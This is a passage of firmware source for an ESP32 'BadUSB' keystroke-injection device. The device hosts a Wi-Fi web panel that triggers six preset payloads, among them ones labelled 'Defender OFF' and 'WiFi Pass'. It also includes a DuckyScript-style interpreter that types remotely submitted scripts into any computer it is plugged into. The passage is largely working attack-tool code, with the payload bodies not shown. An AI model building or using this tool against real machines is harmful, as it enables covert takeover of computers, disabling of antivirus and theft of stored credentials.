  Serial.println("      ✓ Configuración OK\n");
  Serial.println("========================================");
  Serial.println("✓ SISTEMA LISTO - paWi v2.2 LATAM");
  Serial.println("========================================");
  Serial.println("WiFi: " + String(ap_ssid) + " | Pass: " + String(ap_password));
  Serial.println("Web: http://192.168.4.1");
  Serial.println("Teclado: LATAM optimizado");
  Serial.println("Mejoras: Búsqueda O(log n) | 2ms delays");
  Serial.println("========================================\n");
  
  if (LED_PIN >= 0) {
    digitalWrite(LED_PIN, HIGH);
  }
}
// ============================================================================
// LOOP
// ============================================================================
void loop() {
  server.handleClient();
  if (payloadRunning && (millis() - payloadStartTime > PAYLOAD_TIMEOUT)) {
    payloadRunning = false;
    strncpy(lastPayload, "Timeout!", sizeof(lastPayload) - 1);
    Serial.println("[ERROR] ⏱️ Timeout!");
    setLED(true);
    releaseKey();
  }
  yield();
  delay(10);
}
// ============================================================================
// CONFIGURACIÓN DEL SERVIDOR WEB
// ============================================================================
void setupServer() {
  // Página principal
  server.on("/", HTTP_GET, []() {
    Serial.println("[WEB] GET /");
    server.send(200, "text/html", index_html);
  });
  // Ejecutar payload predefinido
  server.on("/execute", HTTP_GET, []() {
    unsigned long now = millis();
    if (now - lastRequestTime < REQUEST_COOLDOWN) {
      server.send(429, "text/plain", "⚠️ Cooldown activo");
      return;
    }
    lastRequestTime = now;
    if (server.hasArg("id")) {
      int id = server.arg("id").toInt();
      if (id < 1 || id > 6) {
        server.send(400, "text/plain", "❌ ID inválido (1-6)");
        return;
      }
      if (payloadRunning) {
        server.send(429, "text/plain", "⚠️ Payload en ejecución");
        return;
      }
      server.send(200, "text/plain", "Payload ejecutándose");
      executePayload(id);
    } else {
      server.send(400, "text/plain", "❌ Falta parámetro ID");
    }
  });
  // Ejecutar payload personalizado
  server.on("/custom", HTTP_POST, []() {
    unsigned long now = millis();
    if (now - lastRequestTime < REQUEST_COOLDOWN) {
      server.send(429, "text/plain", "⚠️ Cooldown activo");
      return;
    }
    lastRequestTime = now;
    if (payloadRunning) {
      server.send(429, "text/plain", "⚠️ Payload en ejecución");
      return;
    }
    String payload = server.arg("plain");
    if (payload.length() > MAX_PAYLOAD_SIZE) {
      server.send(413, "text/plain", "❌ Payload muy grande");
      return;
    }
    if (payload.length() == 0) {
      server.send(400, "text/plain", "❌ Payload vacío");
      return;
    }
    server.send(200, "text/plain", "Payload ejecutándose");
    executeCustom(payload);
  });
  // Estado del sistema
  server.on("/status", HTTP_GET, []() {
    String json = "{\"last\":\"" + String(lastPayload) + "\",\"total\":" + String(totalPayloads) + "}";
    server.send(200, "application/json", json);
  });
  // Health check
  server.on("/health", HTTP_GET, []() {
    String health = "{";
    health += "\"status\":\"ok\",";
    health += "\"version\":\"2.2-LATAM\",";
    health += "\"uptime\":" + String(millis() / 1000) + ",";
    health += "\"freeHeap\":" + String(ESP.getFreeHeap()) + ",";
    health += "\"wifiClients\":" + String(WiFi.softAPgetStationNum());
    health += "}";
    server.send(200, "application/json", health);
  });
  server.onNotFound([]() {
    server.send(404, "text/plain", "404: Not Found");
  });
}
// ============================================================================
// EJECUTAR PAYLOAD PREDEFINIDO
// ============================================================================
void executePayload(int id) {
  payloadRunning = true;
  payloadStartTime = millis();
  setLED(false);
  initUSBOTG();
  Serial.println("  Esperando USB (5s)...");
  delay(DELAY_INITIAL);
  Serial.println("  Ejecutando payload #" + String(id) + "...");
  releaseKey();
  switch(id) {
    case 1: payload_Notepad(); strncpy(lastPayload, "ASCII Art", sizeof(lastPayload) - 1); break;
    case 2: payload_CMD(); strncpy(lastPayload, "System Info", sizeof(lastPayload) - 1); break;
    case 3: payload_SysInfo(); strncpy(lastPayload, "GitHub Clone", sizeof(lastPayload) - 1); break;
    case 4: payload_URL(); strncpy(lastPayload, "URL Cybersen", sizeof(lastPayload) - 1); break;
    case 5: payload_PS(); strncpy(lastPayload, "Defender OFF", sizeof(lastPayload) - 1); break;
    case 6: payload_WiFi(); strncpy(lastPayload, "WiFi Pass", sizeof(lastPayload) - 1); break;
    default: strncpy(lastPayload, "Error", sizeof(lastPayload) - 1); break;
  }
  releaseKey();
  totalPayloads++;
  setLED(true);
  payloadRunning = false;
  Serial.println("  ✓ Payload completado\n");
}

// ============================================================================
// EJECUTAR PAYLOAD PERSONALIZADO
// ============================================================================
void executeCustom(String payload) {
  payloadRunning = true;
  payloadStartTime = millis();
  setLED(false);
  initUSBOTG();
  Serial.println("  Esperando USB (5s)...");
  delay(DELAY_INITIAL);
  Serial.println("  Ejecutando custom...");
  releaseKey();
  const char* payloadPtr = payload.c_str();
  int payloadLen = payload.length();
  int lineStart = 0;
  for (int i = 0; i <= payloadLen; i++) {
    if (i == payloadLen || payloadPtr[i] == '\n' || payloadPtr[i] == '\r') {
      int lineLen = i - lineStart;
      if (lineLen > 0) {
        String line = "";
        line.reserve(lineLen + 1);
        for (int j = lineStart; j < i; j++) {
          if (payloadPtr[j] != '\r') {
            line += payloadPtr[j];
          }
        }
        line.trim();
        if (line.length() > 0) {
          processCommand(line);
        }
      }
      lineStart = i + 1;
    }
    if (millis() - payloadStartTime > PAYLOAD_TIMEOUT) {
      Serial.println("  [WARN] Timeout");
      break;
    }
  }
  releaseKey();
  setLED(true);
  payloadRunning = false;
  strncpy(lastPayload, "Custom", sizeof(lastPayload) - 1);
  totalPayloads++;
  Serial.println("  ✓ Custom completado\n");
}
// ============================================================================
// PROCESAR COMANDO INDIVIDUAL
// ============================================================================
void processCommand(String line) {
  if (line.startsWith("STRING ")) {
    writeStringHID(line.substring(7));
  } else if (line == "ENTER") {
    sendKeyReport(HID_KEY_ENTER, 0);
    releaseKey();
  } else if (line.startsWith("DELAY ")) {
    delay(line.substring(6).toInt());
  } else if (line == "GUI") {
    sendKeyReport(0, HID_MOD_LGUI);
    releaseKey();
  } else if (line.startsWith("GUI ")) {
    String keyStr = line.substring(4);
    uint8_t hidCode = parseSpecialKey(keyStr);
    if (hidCode != 0) {
      sendKeyReport(hidCode, HID_MOD_LGUI);
      releaseKey();
    }
  } else if (line.startsWith("ALT ")) {
    String keyStr = line.substring(4);
    uint8_t hidCode = parseSpecialKey(keyStr);
    if (hidCode != 0) {
      sendKeyReport(hidCode, HID_MOD_LALT);
      releaseKey();
    }
  } else if (line.startsWith("CTRL ")) {
    String keyStr = line.substring(5);
    uint8_t hidCode = parseSpecialKey(keyStr);
    if (hidCode != 0) {
      sendKeyReport(hidCode, HID_MOD_LCTRL);
      releaseKey();
    }
  } else if (line.startsWith("SHIFT ")) {
    String keyStr = line.substring(6);
    uint8_t hidCode = parseSpecialKey(keyStr);
    if (hidCode != 0) {
      sendKeyReport(hidCode, HID_MOD_LSHIFT);
      releaseKey();
    }
  } else if (line == "TAB") {
    sendKeyReport(HID_KEY_TAB, 0);
    releaseKey();
  } else if (line == "ESC" || line == "ESCAPE") {
    sendKeyReport(HID_KEY_ESC, 0);
    releaseKey();
  } else if (line == "SPACE") {
    sendKeyReport(HID_KEY_SPACE, 0);
    releaseKey();
  } else if (line == "BACKSPACE") {
    sendKeyReport(HID_KEY_BACKSPACE, 0);
    releaseKey();
  } else if (line == "DELETE" || line == "DEL") {
    sendKeyReport(HID_KEY_DELETE, 0);
    releaseKey();
  } else if (line == "INSERT") {
    sendKeyReport(HID_KEY_INSERT, 0);
    releaseKey();
  } else if (line == "HOME") {
    sendKeyReport(HID_KEY_HOME, 0);
    releaseKey();
  } else if (line == "END") {
    sendKeyReport(HID_KEY_END, 0);
    releaseKey();
  } else if (line == "PAGEUP" || line == "PGUP") {
    sendKeyReport(HID_KEY_PAGE_UP, 0);
    releaseKey();
  } else if (line == "PAGEDOWN" || line == "PGDOWN") {
    sendKeyReport(HID_KEY_PAGE_DOWN, 0);
    releaseKey();
  } else if (line == "UP" || line == "UPARROW") {
    sendKeyReport(HID_KEY_UP, 0);
    releaseKey();
  } else if (line == "DOWN" || line == "DOWNARROW") {
    sendKeyReport(HID_KEY_DOWN, 0);
    releaseKey();
  } else if (line == "LEFT" || line == "LEFTARROW") {
    sendKeyReport(HID_KEY_LEFT, 0);
    releaseKey(); 
  } else if (line == "RIGHT" || line == "RIGHTARROW") {
    sendKeyReport(HID_KEY_RIGHT, 0);
    releaseKey();  
  } else if (line.startsWith("F") && line.length() >= 2) {
    uint8_t hidCode = parseSpecialKey(line);
    if (hidCode != 0) {
      sendKeyReport(hidCode, 0);
      releaseKey();
    }
  }
  delay(50);
}